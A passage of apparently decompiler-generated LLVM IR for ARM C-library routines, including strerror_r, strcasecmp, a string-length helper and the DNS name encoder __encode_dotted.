  %tmp = ptrtoint i8* %arg1 to i32
  %v0_105f0 = load i32, i32* @r1, align 4
  %v2_105f0 = icmp eq i32 %v0_105f0, 0
  br i1 %v2_105f0, label %bb, label %dec_label_pc_10620

bb:                                               ; preds = %entry
  ret i32 0

dec_label_pc_10608:                               ; preds = %dec_label_pc_10630
  %v3_10608 = icmp uge i32 %v5_106bc, %v1_10608
  %v9_10608 = icmp eq i32 %v5_106bc, %v1_10608
  %v2_1060c = xor i1 %v3_10608, true
  %v3_1060c = or i1 %v9_10608, %v2_1060c
  br i1 %v3_1060c, label %bb19, label %bb20

bb19:                                             ; preds = %dec_label_pc_10608
  %v6_1060c = sub i32 %v5_106bc, %tmp
  br label %bb20

bb20:                                             ; preds = %dec_label_pc_10608, %bb19
  %v5_10610 = phi i32 [ %v1_10608, %dec_label_pc_10608 ], [ %v6_1060c, %bb19 ]
  %v2_10610 = xor i1 %v9_10608, true
  %v3_10610 = and i1 %v3_10608, %v2_10610
  br i1 %v3_10610, label %bb21, label %bb22

bb21:                                             ; preds = %bb20
  %v6_10610 = sub i32 %v5_10610, %tmp
  br label %bb22

bb22:                                             ; preds = %bb20, %bb21
  %v8_10614 = phi i32 [ %v5_10610, %bb20 ], [ %v6_10610, %bb21 ]
  ret i32 %v8_10614

dec_label_pc_10618:                               ; preds = %dec_label_pc_10664
  br label %dec_label_pc_106b8

dec_label_pc_10620:                               ; preds = %entry
  %v2_10620 = add i32 %tmp, %v0_105f0
  %v3_10620 = icmp ult i32 %v2_10620, %tmp
  br i1 %v3_10620, label %bb23, label %bb24

bb23:                                             ; preds = %dec_label_pc_10620
  br label %bb24

bb24:                                             ; preds = %dec_label_pc_10620, %bb23
  %v5_106bc = phi i32 [ %v2_10620, %dec_label_pc_10620 ], [ -1, %bb23 ]
  %v1_106402 = urem i32 %tmp, 4
  %v2_106403 = icmp eq i32 %v1_106402, 0
  br i1 %v2_106403, label %dec_label_pc_10648, label %dec_label_pc_10630

dec_label_pc_10630:                               ; preds = %bb24, %dec_label_pc_1063c
  %v1_10608 = phi i32 [ %v1_1063c, %dec_label_pc_1063c ], [ %tmp, %bb24 ]
  %v1_10630 = inttoptr i32 %v1_10608 to i8*
  %v2_10630 = load i8, i8* %v1_10630, align 1
  %v2_10634 = icmp eq i8 %v2_10630, 0
  br i1 %v2_10634, label %dec_label_pc_10608, label %dec_label_pc_1063c

dec_label_pc_1063c:                               ; preds = %dec_label_pc_10630
  %v1_1063c = add i32 %v1_10608, 1
  %v1_10640 = urem i32 %v1_1063c, 4
  %v2_10640 = icmp eq i32 %v1_10640, 0
  br i1 %v2_10640, label %dec_label_pc_10648, label %dec_label_pc_10630

dec_label_pc_10648:                               ; preds = %dec_label_pc_1063c, %bb24
  %storemerge.lcssa = phi i32 [ %tmp, %bb24 ], [ %v1_1063c, %dec_label_pc_1063c ]
  store i32 %storemerge.lcssa, i32* @lr, align 4
  %v3_106a832 = icmp ult i32 %storemerge.lcssa, %v5_106bc
  br i1 %v3_106a832, label %dec_label_pc_10650, label %dec_label_pc_106b8

dec_label_pc_10650:                               ; preds = %dec_label_pc_106a4, %dec_label_pc_10648
  %v0_1061839 = phi i32 [ %v4_10650, %dec_label_pc_106a4 ], [ %storemerge.lcssa, %dec_label_pc_10648 ]
  %v1_10650 = inttoptr i32 %v0_1061839 to i32*
  %v2_10650 = load i32, i32* %v1_10650, align 4
  %v4_10650 = add i32 %v0_1061839, 4
  store i32 %v4_10650, i32* @lr, align 4
  %v2_10654 = add i32 %v2_10650, -16843009
  %v2_10658 = and i32 %v2_10654, -2139062144
  %v2_1065c = icmp eq i32 %v2_10658, 0
  br i1 %v2_1065c, label %dec_label_pc_106a4, label %dec_label_pc_10664

dec_label_pc_10664:                               ; preds = %dec_label_pc_10650
  %v2_10664 = inttoptr i32 %v0_1061839 to i8*
  %v3_10664 = load i8, i8* %v2_10664, align 1
  %v2_1066c = icmp eq i8 %v3_10664, 0
  %v1_10670 = add i32 %v0_1061839, 1
  br i1 %v2_1066c, label %dec_label_pc_10618, label %dec_label_pc_10678

dec_label_pc_10678:                               ; preds = %dec_label_pc_10664
  %v2_10678 = inttoptr i32 %v1_10670 to i8*
  %v3_10678 = load i8, i8* %v2_10678, align 1
  %v2_1067c = icmp eq i8 %v3_10678, 0
  br i1 %v2_1067c, label %dec_label_pc_106b8, label %dec_label_pc_10684

dec_label_pc_10684:                               ; preds = %dec_label_pc_10678
  %v1_10684 = add i32 %v0_1061839, 2
  %v2_10684 = inttoptr i32 %v1_10684 to i8*
  %v3_10684 = load i8, i8* %v2_10684, align 1
  %v2_10688 = icmp eq i8 %v3_10684, 0
  br i1 %v2_10688, label %dec_label_pc_106b8, label %dec_label_pc_10694

dec_label_pc_10694:                               ; preds = %dec_label_pc_10684
  %v1_10694 = add i32 %v0_1061839, 3
  %v2_10694 = inttoptr i32 %v1_10694 to i8*
  %v3_10694 = load i8, i8* %v2_10694, align 1
  %v2_10698 = icmp eq i8 %v3_10694, 0
  br i1 %v2_10698, label %dec_label_pc_106b8, label %dec_label_pc_106a4

dec_label_pc_106a4:                               ; preds = %dec_label_pc_10694, %dec_label_pc_10650
  %v3_106a8 = icmp ult i32 %v4_10650, %v5_106bc
  br i1 %v3_106a8, label %dec_label_pc_10650, label %dec_label_pc_106b8

dec_label_pc_106b8:                               ; preds = %dec_label_pc_106a4, %dec_label_pc_10648, %dec_label_pc_10678, %dec_label_pc_10684, %dec_label_pc_10694, %dec_label_pc_10618
  %v1_106b8 = phi i32 [ %v0_1061839, %dec_label_pc_10618 ], [ %storemerge.lcssa, %dec_label_pc_10648 ], [ %v1_10670, %dec_label_pc_10678 ], [ %v1_10684, %dec_label_pc_10684 ], [ %v1_10694, %dec_label_pc_10694 ], [ %v5_106bc, %dec_label_pc_106a4 ]
  %v3_106b8 = icmp uge i32 %v5_106bc, %v1_106b8
  %v9_106b8 = icmp eq i32 %v5_106bc, %v1_106b8
  %v2_106bc = xor i1 %v3_106b8, true
  %v3_106bc = or i1 %v9_106b8, %v2_106bc
  br i1 %v3_106bc, label %bb25, label %bb26

bb25:                                             ; preds = %dec_label_pc_106b8
  %v6_106bc = sub i32 %v5_106bc, %tmp
  br label %bb26

bb26:                                             ; preds = %dec_label_pc_106b8, %bb25
  %v5_106c0 = phi i32 [ %v1_106b8, %dec_label_pc_106b8 ], [ %v6_106bc, %bb25 ]
  %v2_106c0 = xor i1 %v9_106b8, true
  %v3_106c0 = and i1 %v3_106b8, %v2_106c0
  br i1 %v3_106c0, label %bb27, label %bb28

bb27:                                             ; preds = %bb26
  %v6_106c0 = sub i32 %v5_106c0, %tmp
  br label %bb28

bb28:                                             ; preds = %bb26, %bb27
  %v8_106c4 = phi i32 [ %v5_106c0, %bb26 ], [ %v6_106c0, %bb27 ]
  ret i32 %v8_106c4

; uselistorder directives
  uselistorder i1 %v3_106b8, { 1, 0 }
  uselistorder i32 %v4_10650, { 1, 2, 0 }
  uselistorder i32 %v0_1061839, { 0, 6, 5, 4, 3, 1, 2 }
  uselistorder i32 %v1_1063c, { 1, 0, 2 }
  uselistorder i32 %v1_10608, { 3, 4, 2, 1, 0 }
  uselistorder i32 %v5_106bc, { 3, 4, 5, 0, 2, 1, 8, 7, 6 }
  uselistorder i1 %v3_10608, { 1, 0 }
  uselistorder i32 %tmp, { 4, 3, 5, 7, 8, 0, 6, 2, 1 }
  uselistorder label %bb28, { 1, 0 }
  uselistorder label %bb26, { 1, 0 }
  uselistorder label %dec_label_pc_106b8, { 0, 4, 3, 2, 1, 5 }
  uselistorder label %dec_label_pc_10630, { 1, 0 }
  uselistorder label %bb24, { 1, 0 }
  uselistorder label %bb22, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
}

define i32 @__GI___glibc_strerror_r(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r1, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_106d8 = call i32 @__xpg_strerror_r()
  %v0_106dc = load i32, i32* @r4, align 4
  ret i32 %v0_106dc
}

define i32 @__xpg_strerror_r() local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-25 = alloca i32, align 4
  %v3_106e4 = load i32, i32* @r4, align 4
  %v0_106e8 = load i32, i32* @r0, align 4
  %v0_106f4 = load i32, i32* @r1, align 4
  store i32 %v0_106f4, i32* @r8, align 4
  %v0_106f8 = load i32, i32* @r2, align 4
  store i32 %v0_106f8, i32* @r6, align 4
  %tmp = icmp ult i32 %v0_106e8, 125
  br i1 %tmp, label %thread-pre-split.preheader, label %dec_label_pc_10730

thread-pre-split.preheader:                       ; preds = %entry
  store i32 ptrtoint ([8 x i8]* @global_var_12928.387 to i32), i32* @r5, align 4
  %v2_107183547 = icmp eq i32 %v0_106e8, 0
  br i1 %v2_107183547, label %bb27, label %dec_label_pc_1070c.lr.ph

dec_label_pc_1070c:                               ; preds = %dec_label_pc_1070c.lr.ph, %bb
  %v2_1072442 = phi i1 [ %v2_107243950, %dec_label_pc_1070c.lr.ph ], [ %v2_10724, %bb ]
  %v1_1072841 = phi i32 [ %v0_10718.pr49, %dec_label_pc_1070c.lr.ph ], [ %v2_10714, %bb ]
  %v0_1071040 = phi i32 [ %v0_1071c648, %dec_label_pc_1070c.lr.ph ], [ %v1_10710, %bb ]
  %v1_10710 = add i32 %v0_1071040, 1
  store i32 %v1_10710, i32* @r5, align 4
  br i1 %v2_1072442, label %bb, label %thread-pre-split.loopexit

bb:                                               ; preds = %dec_label_pc_1070c
  %v2_10714 = add i32 %v1_1072841, -1
  %v2_10718 = icmp eq i32 %v2_10714, 0
  %v1_1071c = inttoptr i32 %v1_10710 to i8*
  %v2_1071c = load i8, i8* %v1_1071c, align 1
  %v2_10724 = icmp eq i8 %v2_1071c, 0
  br i1 %v2_10718, label %dec_label_pc_10724, label %dec_label_pc_1070c

thread-pre-split.loopexit:                        ; preds = %dec_label_pc_1070c
  %v1_1071c36 = inttoptr i32 %v1_10710 to i8*
  %v2_1071c37 = load i8, i8* %v1_1071c36, align 1
  %v2_1072439 = icmp eq i8 %v2_1071c37, 0
  br label %dec_label_pc_1070c.lr.ph

dec_label_pc_1070c.lr.ph:                         ; preds = %thread-pre-split.loopexit, %thread-pre-split.preheader
  %v2_107243950 = phi i1 [ %v2_1072439, %thread-pre-split.loopexit ], [ false, %thread-pre-split.preheader ]
  %v0_10718.pr49 = phi i32 [ %v1_1072841, %thread-pre-split.loopexit ], [ %v0_106e8, %thread-pre-split.preheader ]
  %v0_1071c648 = phi i32 [ %v1_10710, %thread-pre-split.loopexit ], [ ptrtoint ([8 x i8]* @global_var_12928.387 to i32), %thread-pre-split.preheader ]
  br label %dec_label_pc_1070c

dec_label_pc_10724:                               ; preds = %bb
  br i1 %v2_10724, label %dec_label_pc_10730, label %bb27

bb27:                                             ; preds = %thread-pre-split.preheader, %dec_label_pc_10724
  %v0_10710.lcssa56 = phi i32 [ %v1_10710, %dec_label_pc_10724 ], [ ptrtoint ([8 x i8]* @global_var_12928.387 to i32), %thread-pre-split.preheader ]
  store i32 0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_10764

dec_label_pc_10730:                               ; preds = %dec_label_pc_10724, %entry
  %v3_10734 = ashr i32 %v0_106e8, 31
  %v5_10748 = bitcast i32* %stack_var_-25 to i8*
  %v6_10748 = call i32 @_uintmaxtostr(i8* %v5_10748, i32 %v0_106e8, i32 %v3_10734, i32 -10, i32 0)
  %v1_1074c = add i32 %v6_10748, -14
  store i32 %v1_1074c, i32* @r5, align 4
  store i32 %v1_1074c, i32* @r0, align 4
  store i32 ptrtoint ([15 x i8]* @global_var_12918.389 to i32), i32* @r1, align 4
  store i32 14, i32* @r2, align 4
  %v0_1075c = call i32 @memcpy()
  store i32 22, i32* %r7.global-to-local, align 4
  %v0_10764.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_10764

dec_label_pc_10764:                               ; preds = %bb27, %dec_label_pc_10730
  %v0_10764 = phi i32 [ %v0_10710.lcssa56, %bb27 ], [ %v0_10764.pre, %dec_label_pc_10730 ]
  %v1_10764 = inttoptr i32 %v0_10764 to i8*
  %v3_10768 = call i32 @strlen(i8* %v1_10764)
  %v0_1076c = load i32, i32* @r8, align 4
  %v2_1076c = icmp eq i32 %v0_1076c, 0
  %v1_10770 = add i32 %v3_10768, 1
  store i32 %v1_10770, i32* @r4, align 4
  br i1 %v2_1076c, label %bb28, label %dec_label_pc_10764._crit_edge

dec_label_pc_10764._crit_edge:                    ; preds = %dec_label_pc_10764
  %v1_10778.pre = load i32, i32* @r6, align 4
  br label %bb29

bb28:                                             ; preds = %dec_label_pc_10764
  br label %bb29

bb29:                                             ; preds = %dec_label_pc_10764._crit_edge, %bb28
  %v4_1077c = phi i32 [ %v1_10778.pre, %dec_label_pc_10764._crit_edge ], [ 0, %bb28 ]
  %tmp57 = icmp ugt i32 %v1_10770, %v4_1077c
  br i1 %tmp57, label %bb30, label %.thread17

bb30:                                             ; preds = %bb29
  store i32 %v4_1077c, i32* @r4, align 4
  store i32 34, i32* %r7.global-to-local, align 4
  br label %.thread17

.thread17:                                        ; preds = %bb29, %bb30
  %v0_1078c15 = phi i32 [ %v4_1077c, %bb30 ], [ %v1_10770, %bb29 ]
  %v2_10784 = icmp eq i32 %v0_1078c15, 0
  br i1 %v2_10784, label %dec_label_pc_107a8, label %dec_label_pc_1078c

dec_label_pc_1078c:                               ; preds = %.thread17
  store i32 %v0_1078c15, i32* @r2, align 4
  %v0_10790 = load i32, i32* @r5, align 4
  store i32 %v0_10790, i32* @r1, align 4
  store i32 %v0_1076c, i32* @r0, align 4
  %v0_10798 = call i32 @memcpy()
  %v0_1079c = load i32, i32* @r8, align 4
  %v1_1079c = load i32, i32* @r4, align 4
  %v2_1079c = add i32 %v1_1079c, %v0_1079c
  %v3_107a4 = add i32 %v2_1079c, -1
  %v4_107a4 = inttoptr i32 %v3_107a4 to i8*
  store i8 0, i8* %v4_107a4, align 1
  br label %dec_label_pc_107a8

dec_label_pc_107a8:                               ; preds = %.thread17, %dec_label_pc_1078c
  %v0_107a8 = load i32, i32* %r7.global-to-local, align 4
  %v2_107a8 = icmp eq i32 %v0_107a8, 0
  br i1 %v2_107a8, label %dec_label_pc_107b8, label %dec_label_pc_107b0

dec_label_pc_107b0:                               ; preds = %dec_label_pc_107a8
  %v0_107b0 = call i32 @__errno_location()
  %v0_107b4 = load i32, i32* %r7.global-to-local, align 4
  %v2_107b4 = inttoptr i32 %v0_107b0 to i32*
  store i32 %v0_107b4, i32* %v2_107b4, align 4
  %v0_107b8.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_107b8

dec_label_pc_107b8:                               ; preds = %dec_label_pc_107a8, %dec_label_pc_107b0
  %v0_107b8 = phi i32 [ 0, %dec_label_pc_107a8 ], [ %v0_107b8.pre, %dec_label_pc_107b0 ]
  store i32 %v3_106e4, i32* @r4, align 4
  ret i32 %v0_107b8

; uselistorder directives
  uselistorder i32 %v4_1077c, { 1, 2, 0 }
  uselistorder i32 %v1_10770, { 1, 0, 2 }
  uselistorder i32 %v1_10710, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32 %v0_106e8, { 4, 3, 1, 2, 0 }
  uselistorder i32* %r7.global-to-local, { 4, 2, 3, 0, 1, 5 }
  uselistorder i32 34, { 3, 4, 1, 2, 0, 5, 6 }
  uselistorder i32 -10, { 1, 0, 2 }
  uselistorder label %dec_label_pc_107b8, { 1, 0 }
  uselistorder label %dec_label_pc_107a8, { 1, 0 }
  uselistorder label %.thread17, { 1, 0 }
  uselistorder label %bb29, { 1, 0 }
  uselistorder label %dec_label_pc_10764, { 1, 0 }
  uselistorder label %bb27, { 1, 0 }
}

define i32 @__GI_strcasecmp(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @lr, align 4
  br label %dec_label_pc_107dc

dec_label_pc_107dc:                               ; preds = %bb8, %entry
  %v8_108403 = phi i32 [ %v8_10840, %bb8 ], [ 0, %entry ]
  %v0_10834 = phi i32 [ %v1_10834, %bb8 ], [ %arg2, %entry ]
  %v0_10838 = phi i32 [ %v1_10838, %bb8 ], [ %tmp, %entry ]
  %v9_107dc = icmp eq i32 %v0_10838, %v0_10834
  br i1 %v9_107dc, label %dec_label_pc_107dc._crit_edge, label %dec_label_pc_107e4

dec_label_pc_107dc._crit_edge:                    ; preds = %dec_label_pc_107dc
  %.pre = inttoptr i32 %v0_10834 to i8*
  br label %bb8

dec_label_pc_107e4:                               ; preds = %dec_label_pc_107dc
  %v1_107e8 = inttoptr i32 %v0_10838 to i8*
  %v2_107e8 = load i8, i8* %v1_107e8, align 1
  %v3_107e8 = zext i8 %v2_107e8 to i32
  %v1_107ec = inttoptr i32 %v0_10834 to i8*
  %v2_107ec = load i8, i8* %v1_107ec, align 1
  %v3_107ec = zext i8 %v2_107ec to i32
  %v2_107f0 = load i32, i32* bitcast (i32** @global_var_1b86c.350 to i32*), align 4
  %v2_107f4 = mul nuw nsw i32 %v3_107e8, 2
  %v2_107f8 = mul nuw nsw i32 %v3_107ec, 2
  %v2_107fc = add i32 %v2_107f8, %v2_107f0
  %v2_10800 = add i32 %v2_107f0, %v2_107f4
  %v1_10804 = add i32 %v2_10800, 1
  %v2_10804 = inttoptr i32 %v1_10804 to i8*
  %v3_10804 = load i8, i8* %v2_10804, align 1
  %v4_10804 = zext i8 %v3_10804 to i32
  %v1_10808 = add i32 %v2_107fc, 1
  %v2_10808 = inttoptr i32 %v1_10808 to i8*
  %v3_10808 = load i8, i8* %v2_10808, align 1
  %v4_10808 = zext i8 %v3_10808 to i32
  %v3_1080c = inttoptr i32 %v2_107fc to i8*
  %v4_1080c = load i8, i8* %v3_1080c, align 1
  %v6_1080c = zext i8 %v4_1080c to i32
  %v3_10810 = inttoptr i32 %v2_10800 to i8*
  %v4_10810 = load i8, i8* %v3_10810, align 1
  %v6_10810 = zext i8 %v4_10810 to i32
  %v3_10814 = mul nuw i32 %v4_10808, 16777216
  %v3_10818 = mul nuw i32 %v4_10804, 16777216
  %v4_1081c = sdiv i32 %v3_10818, 65536
  %v5_1081c = or i32 %v6_10810, %v4_1081c
  %v4_10820 = sdiv i32 %v3_10814, 65536
  %v5_10820 = or i32 %v4_10820, %v6_1080c
  %v2_10824 = sub nsw i32 %v5_1081c, %v5_10820
  %v9_10824 = icmp eq i32 %v5_1081c, %v5_10820
  br i1 %v9_10824, label %bb8, label %bb

bb:                                               ; preds = %dec_label_pc_107e4
  ret i32 %v2_10824

bb8:                                              ; preds = %dec_label_pc_107dc._crit_edge, %dec_label_pc_107e4
  %v1_1082c.pre-phi = phi i8* [ %.pre, %dec_label_pc_107dc._crit_edge ], [ %v1_107e8, %dec_label_pc_107e4 ]
  %v8_10840 = phi i32 [ %v8_108403, %dec_label_pc_107dc._crit_edge ], [ %v2_10824, %dec_label_pc_107e4 ]
  %v2_1082c = load i8, i8* %v1_1082c.pre-phi, align 1
  %v2_10830 = icmp eq i8 %v2_1082c, 0
  %v1_10834 = add i32 %v0_10834, 1
  %v1_10838 = add i32 %v0_10838, 1
  store i32 %v1_10838, i32* @lr, align 4
  br i1 %v2_10830, label %dec_label_pc_10840, label %dec_label_pc_107dc

dec_label_pc_10840:                               ; preds = %bb8
  ret i32 %v8_10840

; uselistorder directives
  uselistorder i32 %v1_10838, { 1, 0 }
  uselistorder i32 %v2_10824, { 1, 0 }
  uselistorder i32 %v5_10820, { 1, 0 }
  uselistorder i32 %v5_1081c, { 1, 0 }
  uselistorder i32 %v0_10834, { 1, 2, 0, 3 }
  uselistorder label %bb8, { 1, 0 }
}

define i32 @__encode_dotted(i8* %arg1) local_unnamed_addr {
entry:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_10848 = load i32, i32* @r4, align 4
  store i32 %v3_10848, i32* %stack_var_-24, align 4
  %v6_10848 = load i32, i32* @r5, align 4
  %v9_10848 = load i32, i32* @r6, align 4
  store i32 %tmp, i32* @r4, align 4
  %v0_10850 = load i32, i32* @r1, align 4
  store i32 %v0_10850, i32* @r6, align 4
  %v0_10854 = load i32, i32* @r2, align 4
  store i32 %v0_10854, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  store i32 %tmp, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_108bc19 = icmp slt i8* %arg1, null
  store i1 %v1_108bc19, i1* %cpsr_n.global-to-local, align 1
  %v2_108bc20 = icmp eq i8* %arg1, null
  store i1 %v2_108bc20, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_108bc20, label %dec_label_pc_108d4, label %dec_label_pc_108c8

dec_label_pc_10860:                               ; preds = %dec_label_pc_108c8
  %v2_10860 = call i32 @__GI_strchr(i32 %v0_1086021, i32 46)
  store i32 %v2_10860, i32* @r5, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_10864 = icmp slt i32 %v2_10860, 0
  store i1 %v1_10864, i1* %cpsr_n.global-to-local, align 1
  %v2_10864 = icmp eq i32 %v2_10860, 0
  store i1 %v2_10864, i1* %cpsr_z.global-to-local, align 1
  %v0_10868 = load i32, i32* @r4, align 4
  %v2_10868 = sub i32 %v2_10860, %v0_10868
  store i32 %v2_10868, i32* %ip.global-to-local, align 4
  store i32 %v0_10868, i32* %r0.global-to-local, align 4
  br i1 %v2_10864, label %dec_label_pc_10874, label %dec_label_pc_1087c

dec_label_pc_10874:                               ; preds = %dec_label_pc_10860
  %v1_1086c = inttoptr i32 %v0_10868 to i8*
  %v3_10874 = call i32 @strlen(i8* %v1_1086c)
  store i32 %v3_10874, i32* %r0.global-to-local, align 4
  %sext = mul i32 %v3_10874, 16777216
  %v1_10878 = sdiv i32 %sext, 16777216
  store i32 %v1_10878, i32* %ip.global-to-local, align 4
  %v0_10888.pre = load i32, i32* @r4, align 4
  %v0_10898.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1087c

dec_label_pc_1087c:                               ; preds = %dec_label_pc_10860, %dec_label_pc_10874
  %v0_10898 = phi i32 [ %v2_10860, %dec_label_pc_10860 ], [ %v0_10898.pre, %dec_label_pc_10874 ]
  %v0_10888 = phi i32 [ %v0_10868, %dec_label_pc_10860 ], [ %v0_10888.pre, %dec_label_pc_10874 ]
  %v0_108a8 = phi i32 [ %v2_10868, %dec_label_pc_10860 ], [ %v1_10878, %dec_label_pc_10874 ]
  %v0_1087c = load i32, i32* %r7.global-to-local, align 4
  %v1_1087c = add i32 %v0_1087c, 1
  store i32 %v1_1087c, i32* @lr, align 4
  %v1_10880 = load i32, i32* %r8.global-to-local, align 4
  %v2_10880 = sub i32 %v1_10880, %v0_1087c
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_10884 = icmp slt i32 %v0_108a8, 0
  store i1 %v1_10884, i1* %cpsr_n.global-to-local, align 1
  %v2_10884 = icmp eq i32 %v0_108a8, 0
  store i1 %v2_10884, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_10888, i32* @r1, align 4
  %v0_1088c = load i32, i32* @r6, align 4
  %v2_1088c = add i32 %v0_1088c, %v1_1087c
  store i32 %v2_1088c, i32* @r0, align 4
  store i32 %v0_108a8, i32* @r2, align 4
  %v1_10894 = add i32 %v2_10880, -1
  %v1_10898 = add i32 %v0_10898, 1
  store i32 %v1_10898, i32* @r4, align 4
  br i1 %v2_10884, label %.loopexit, label %dec_label_pc_108a0

dec_label_pc_108a0:                               ; preds = %dec_label_pc_1087c
  %v2_108a0 = sub i32 %v0_108a8, %v1_10894
  %v3_108a0 = icmp ult i32 %v0_108a8, %v1_10894
  %v4_108a0 = xor i32 %v1_10894, %v0_108a8
  %v5_108a0 = xor i32 %v2_108a0, %v0_108a8
  %v6_108a0 = and i32 %v5_108a0, %v4_108a0
  %v7_108a0 = icmp slt i32 %v6_108a0, 0
  store i1 %v7_108a0, i1* %cpsr_v.global-to-local, align 1
  %v8_108a0 = icmp slt i32 %v2_108a0, 0
  store i1 %v8_108a0, i1* %cpsr_n.global-to-local, align 1
  %v9_108a0 = icmp eq i32 %v0_108a8, %v1_10894
  store i1 %v9_108a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_108a0, label %dec_label_pc_108a8, label %.loopexit

dec_label_pc_108a8:                               ; preds = %dec_label_pc_108a0
  %v1_108a8 = trunc i32 %v0_108a8 to i8
  %v4_108a8 = add i32 %v0_1088c, %v0_1087c
  %v5_108a8 = inttoptr i32 %v4_108a8 to i8*
  store i8 %v1_108a8, i8* %v5_108a8, align 1
  %v0_108ac = load i32, i32* @lr, align 4
  %v1_108ac = load i32, i32* %ip.global-to-local, align 4
  %v2_108ac = add i32 %v1_108ac, %v0_108ac
  store i32 %v2_108ac, i32* %r7.global-to-local, align 4
  %v0_108b0 = call i32 @memcpy()
  store i32 %v0_108b0, i32* %r0.global-to-local, align 4
  %v0_108b4 = load i32, i32* @r5, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_108b4 = icmp slt i32 %v0_108b4, 0
  store i1 %v1_108b4, i1* %cpsr_n.global-to-local, align 1
  %v2_108b4 = icmp eq i32 %v0_108b4, 0
  store i1 %v2_108b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_108b4, label %dec_label_pc_108d4, label %dec_label_pc_108a8.dec_label_pc_108bc_crit_edge

dec_label_pc_108a8.dec_label_pc_108bc_crit_edge:  ; preds = %dec_label_pc_108a8
  %v0_108bc.pre = load i32, i32* @r4, align 4
  store i32 %v0_108bc.pre, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_108bc = icmp slt i32 %v0_108bc.pre, 0
  store i1 %v1_108bc, i1* %cpsr_n.global-to-local, align 1
  %v2_108bc = icmp eq i32 %v0_108bc.pre, 0
  store i1 %v2_108bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_108bc, label %dec_label_pc_108d4, label %dec_label_pc_108c8

dec_label_pc_108c8:                               ; preds = %entry, %dec_label_pc_108a8.dec_label_pc_108bc_crit_edge
  %v0_1086021 = phi i32 [ %v0_108bc.pre, %dec_label_pc_108a8.dec_label_pc_108bc_crit_edge ], [ %tmp, %entry ]
  %v1_108c8 = inttoptr i32 %v0_1086021 to i8*
  %v2_108c8 = load i8, i8* %v1_108c8, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_108cc = icmp eq i8 %v2_108c8, 0
  store i1 %v2_108cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_108cc, label %dec_label_pc_108d4, label %dec_label_pc_10860

dec_label_pc_108d4:                               ; preds = %dec_label_pc_108a8.dec_label_pc_108bc_crit_edge, %dec_label_pc_108a8, %dec_label_pc_108c8, %entry
  %v0_108d4 = load i32, i32* %r8.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_108d4 = icmp slt i32 %v0_108d4, 0
  store i1 %v1_108d4, i1* %cpsr_n.global-to-local, align 1
  %v2_108d4 = icmp eq i32 %v0_108d4, 0
  store i1 %v2_108d4, i1* %cpsr_z.global-to-local, align 1
  %tmp16 = icmp slt i32 %v0_108d4, 1
  br i1 %tmp16, label %bb17, label %bb

bb:                                               ; preds = %dec_label_pc_108d4
  %v5_108dc = load i32, i32* %r7.global-to-local, align 4
  %v6_108dc = add i32 %v5_108dc, 1
  store i32 %v6_108dc, i32* %r0.global-to-local, align 4
  %v7_108e0 = load i32, i32* @r6, align 4
  %v9_108e0 = add i32 %v7_108e0, %v5_108dc
  %v10_108e0 = inttoptr i32 %v9_108e0 to i8*
  store i8 0, i8* %v10_108e0, align 1
  %v0_108e4.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_108e4.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_108e4.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %bb17

bb17:                                             ; preds = %dec_label_pc_108d4, %bb
  %v2_108e4 = phi i1 [ %v2_108e4.pre, %bb ], [ false, %dec_label_pc_108d4 ]
  %v1_108e4 = phi i1 [ %v1_108e4.pre, %bb ], [ %v1_108d4, %dec_label_pc_108d4 ]
  %v0_108e4 = phi i1 [ %v0_108e4.pre, %bb ], [ %v2_108d4, %dec_label_pc_108d4 ]
  %v3_108e4 = xor i1 %v2_108e4, %v1_108e4
  %v4_108e4 = or i1 %v0_108e4, %v3_108e4
  br i1 %v4_108e4, label %.loopexit, label %bb18

bb18:                                             ; preds = %bb17
  %v7_108e4 = load i32, i32* %stack_var_-24, align 4
  store i32 %v7_108e4, i32* @r4, align 4
  store i32 %v6_10848, i32* @r5, align 4
  store i32 %v9_10848, i32* @r6, align 4
  %v25_108e4 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v25_108e4

.loopexit:                                        ; preds = %dec_label_pc_108a0, %dec_label_pc_1087c, %bb17
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_108ec = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_108ec, i32* @r4, align 4
  store i32 %v6_10848, i32* @r5, align 4
  store i32 %v9_10848, i32* @r6, align 4
  ret i32 -1

; uselistorder directives
